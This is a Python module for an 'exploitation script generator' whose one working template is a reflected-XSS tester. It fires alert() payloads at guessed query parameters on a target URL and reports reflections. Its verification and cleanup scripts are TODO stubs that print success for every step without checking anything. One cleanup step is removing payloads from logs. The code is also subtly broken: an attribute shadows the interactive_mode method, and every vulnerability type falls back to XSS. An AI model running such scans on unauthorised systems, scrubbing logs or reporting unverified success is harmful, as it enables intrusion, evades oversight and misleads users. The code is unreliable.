"""
Exploitation Script Generator Module

This module provides advanced capabilities for generating complete exploitation scripts,
interactive payloads, and automated pentesting workflows.
"""

import asyncio
import json
import re
import subprocess
import tempfile
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

import aiohttp
import requests
from pydantic import BaseModel


class ScriptType(Enum):
    """Types of exploitation scripts"""
    XSS_PAYLOAD = "xss_payload"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    LFI_RFI = "lfi_rfi"
    CSRF_EXPLOIT = "csrf_exploit"
    SSRF_PAYLOAD = "ssrf_payload"
    XXE_PAYLOAD = "xxe_payload"
    REVERSE_SHELL = "reverse_shell"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    CHAIN_EXPLOIT = "chain_exploit"


class TargetType(Enum):
    """Types of targets for exploitation"""
    WEB_APPLICATION = "web_application"
    API_ENDPOINT = "api_endpoint"
    DATABASE = "database"
    FILE_SYSTEM = "file_system"
    NETWORK_SERVICE = "network_service"
    OPERATING_SYSTEM = "operating_system"


@dataclass
class ExploitationContext:
    """Context for exploitation script generation"""
    target_url: str
    target_type: TargetType
    vulnerability_type: ScriptType
    parameters: Dict[str, Any]
    user_input: str
    session_data: Optional[Dict[str, Any]] = None


class ScriptTemplate(BaseModel):
    """Template for exploitation scripts"""
    name: str
    description: str
    script_type: ScriptType
    target_type: TargetType
    template: str
    parameters: List[str]
    verification_steps: List[str]
    cleanup_steps: List[str]
    risk_level: str
    ethical_guidelines: List[str]


class ExploitationScriptGenerator:
    """Advanced exploitation script generator with interactive capabilities"""
    
    def __init__(self):
        self.templates = self._load_templates()
        self.interactive_mode = False
        self.session_history = []
        
    def _load_templates(self) -> Dict[str, ScriptTemplate]:
        """Load script templates from configuration"""
        return {
            "xss_reflected": ScriptTemplate(
                name="Reflected XSS Exploit",
                description="Generate reflected XSS payload with interactive features",
                script_type=ScriptType.XSS_PAYLOAD,
                target_type=TargetType.WEB_APPLICATION,
                template="""
import requests
import re
from urllib.parse import urljoin, quote

class XSSExploit:
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.payloads = []
        
    def generate_payloads(self, context):
        '''Generate context-aware XSS payloads'''
        base_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]
        
        self.payloads.extend(base_payloads)
        return self.payloads
    
    def test_payload(self, payload, injection_point):
        '''Test a specific payload at injection point'''
        try:
            encoded_payload = quote(payload)
            test_url = f"{self.target_url}{injection_point}={encoded_payload}"
            response = self.session.get(test_url)
            
            if payload in response.text:
                return {
                    'success': True,
                    'payload': payload,
                    'url': test_url,
                    'reflection_point': self._find_reflection_point(response.text, payload)
                }
            
            return {'success': False, 'payload': payload, 'reason': 'No reflection detected'}
            
        except Exception as e:
            return {'success': False, 'payload': payload, 'error': str(e)}
    
    def _find_reflection_point(self, html_content, payload):
        '''Find where payload is reflected in HTML'''
        if payload in html_content:
            start = html_content.find(payload)
            context = html_content[max(0, start-50):start+len(payload)+50]
            return context
        return None
    
    def interactive_exploit(self, context):
        '''Interactive exploitation with user guidance'''
        print("ðŸ” Starting interactive XSS exploitation...")
        print(f"Target: {self.target_url}")
        
        payloads = self.generate_payloads(context)
        print(f"Generated {len(payloads)} payloads")
        
        successful_exploits = []
        
        for i, payload in enumerate(payloads):
            print(f"\\n[{i+1}/{len(payloads)}] Testing: {payload}")
            
            injection_points = ['?q=', '?search=', '?id=', '?name=']
            
            for point in injection_points:
                result = self.test_payload(payload, point)
                if result['success']:
                    successful_exploits.append(result)
                    print(f"âœ… SUCCESS: {result['url']}")
                    print(f"   Reflection: {result['reflection_point']}")
                else:
                    print(f"âŒ Failed: {result.get('reason', 'Unknown error')}")
        
        return successful_exploits
""",
                parameters=["target_url", "injection_points", "user_context"],
                verification_steps=[
                    "Check if payload is reflected in response",
                    "Verify JavaScript execution",
                    "Test in different browsers",
                    "Check for WAF bypass techniques"
                ],
                cleanup_steps=[
                    "Remove test payloads from logs",
                    "Clear browser cache",
                    "Document findings"
                ],
                risk_level="Medium",
                ethical_guidelines=[
                    "Only test on authorized systems",
                    "Do not execute malicious code",
                    "Respect rate limits",
                    "Report findings responsibly"
                ]
            )
        }
    
    def generate_script(self, context: ExploitationContext) -> Dict[str, Any]:
        """Generate a complete exploitation script based on context"""
        template_key = self._get_template_key(context.vulnerability_type, context.target_type)
        
        if template_key not in self.templates:
            return {
                'error': f'No template found for {context.vulnerability_type.value} on {context.target_type.value}'
            }
        
        template = self.templates[template_key]
        
        # Generate script content
        script_content = self._render_template(template, context)
        
        # Generate verification and cleanup scripts
        verification_script = self._generate_verification_script(template, context)
        cleanup_script = self._generate_cleanup_script(template, context)
        
        return {
            'script_name': f"{template.name.lower().replace(' ', '_')}_{context.target_url.replace('://', '_').replace('/', '_')}",
            'script_content': script_content,
            'verification_script': verification_script,
            'cleanup_script': cleanup_script,
            'template_info': template.dict(),
            'context': context.__dict__,
            'usage_instructions': self._generate_usage_instructions(template, context),
            'ethical_warnings': template.ethical_guidelines
        }
    
    def _get_template_key(self, script_type: ScriptType, target_type: TargetType) -> str:
        """Get template key based on script and target types"""
        mapping = {
            (ScriptType.XSS_PAYLOAD, TargetType.WEB_APPLICATION): "xss_reflected",
        }
        return mapping.get((script_type, target_type), "xss_reflected")
    
    def _render_template(self, template: ScriptTemplate, context: ExploitationContext) -> str:
        """Render template with context variables"""
        script_content = template.template
        
        # Replace placeholders with context values
        replacements = {
            '{{target_url}}': context.target_url,
            '{{user_input}}': context.user_input,
            '{{parameters}}': json.dumps(context.parameters, indent=2)
        }
        
        for placeholder, value in replacements.items():
            script_content = script_content.replace(placeholder, str(value))
        
        return script_content
    
    def _generate_verification_script(self, template: ScriptTemplate, context: ExploitationContext) -> str:
        """Generate verification script for the exploitation"""
        verification_steps = template.verification_steps
        
        script = f"""
# Verification Script for {template.name}
# Target: {context.target_url}

def verify_exploitation():
    \"\"\"Verify that exploitation was successful\"\"\"
    print("ðŸ” Verifying exploitation results...")
    
    verification_results = []
    
"""
        
        for i, step in enumerate(verification_steps, 1):
            script += f"""
    # Step {i}: {step}
    try:
        # TODO: Implement verification for: {step}
        print(f"âœ… Step {i}: {step}")
        verification_results.append({{'step': {i}, 'status': 'success', 'description': '{step}'}})
    except Exception as e:
        print(f"âŒ Step {i} failed: {{e}}")
        verification_results.append({{'step': {i}, 'status': 'failed', 'error': str(e)}})
"""
        
        script += """
    return verification_results

if __name__ == "__main__":
    results = verify_exploitation()
    print("\\nðŸ“Š Verification Summary:")
    for result in results:
        status = "âœ…" if result['status'] == 'success' else "âŒ"
        print(f"{status} {result['description']}")
"""
        
        return script
    
    def _generate_cleanup_script(self, template: ScriptTemplate, context: ExploitationContext) -> str:
        """Generate cleanup script for the exploitation"""
        cleanup_steps = template.cleanup_steps
        
        script = f"""
# Cleanup Script for {template.name}
# Target: {context.target_url}

def cleanup_exploitation():
    \"\"\"Clean up after exploitation\"\"\"
    print("ðŸ§¹ Cleaning up exploitation artifacts...")
    
    cleanup_results = []
    
"""
        
        for i, step in enumerate(cleanup_steps, 1):
            script += f"""
    # Step {i}: {step}
    try:
        # TODO: Implement cleanup for: {step}
        print(f"âœ… Step {i}: {step}")
        cleanup_results.append({{'step': {i}, 'status': 'success', 'description': '{step}'}})
    except Exception as e:
        print(f"âŒ Step {i} failed: {{e}}")
        cleanup_results.append({{'step': {i}, 'status': 'failed', 'error': str(e)}})
"""
        
        script += """
    return cleanup_results

if __name__ == "__main__":
    results = cleanup_exploitation()
    print("\\nðŸ“Š Cleanup Summary:")
    for result in results:
        status = "âœ…" if result['status'] == 'success' else "âŒ"
        print(f"{status} {result['description']}")
"""
        
        return script
    
    def _generate_usage_instructions(self, template: ScriptTemplate, context: ExploitationContext) -> List[str]:
        """Generate usage instructions for the script"""
        return [
            f"1. Review the script: {template.name}",
            f"2. Ensure target is authorized: {context.target_url}",
            f"3. Set up required dependencies",
            f"4. Run verification script first",
            f"5. Execute main exploitation script",
            f"6. Run cleanup script after completion",
            f"7. Document all findings and actions"
        ]
    
    def interactive_mode(self, context: ExploitationContext) -> Dict[str, Any]:
        """Enable interactive mode for script generation"""
        self.interactive_mode = True
        
        print("ðŸ¤– Interactive Exploitation Script Generator")
        print("=" * 50)
        print(f"Target: {context.target_url}")
        print(f"Vulnerability: {context.vulnerability_type.value}")
        print(f"Target Type: {context.target_type.value}")
        
        # Ask for additional context
        print("\\nðŸ“ Additional Context:")
        context.parameters['user_requirements'] = input("What specific requirements do you have? ")
        context.parameters['environment'] = input("What is the target environment? ")
        context.parameters['constraints'] = input("Any specific constraints or limitations? ")
        
        # Generate script with enhanced context
        result = self.generate_script(context)
        
        # Add interactive features
        result['interactive_features'] = {
            'user_guidance': True,
            'step_by_step_execution': True,
            'real_time_feedback': True,
            'adaptive_payloads': True
        }
        
        return result
    
    def save_script(self, script_data: Dict[str, Any], output_dir: str = "exploitation_scripts") -> str:
        """Save generated script to file"""
        import os
        from datetime import datetime
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        script_name = script_data['script_name']
        filename = f"{script_name}_{timestamp}.py"
        filepath = os.path.join(output_dir, filename)
        
        # Write script content
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(script_data['script_content'])
        
        # Write verification script
        verification_filename = f"{script_name}_verification_{timestamp}.py"
        verification_filepath = os.path.join(output_dir, verification_filename)
        with open(verification_filepath, 'w', encoding='utf-8') as f:
            f.write(script_data['verification_script'])
        
        # Write cleanup script
        cleanup_filename = f"{script_name}_cleanup_{timestamp}.py"
        cleanup_filepath = os.path.join(output_dir, cleanup_filename)
        with open(cleanup_filepath, 'w', encoding='utf-8') as f:
            f.write(script_data['cleanup_script'])
        
        # Write metadata
        metadata_filename = f"{script_name}_metadata_{timestamp}.json"
        metadata_filepath = os.path.join(output_dir, metadata_filename)
        with open(metadata_filepath, 'w', encoding='utf-8') as f:
            json.dump(script_data, f, indent=2, default=str)
        
        return filepath
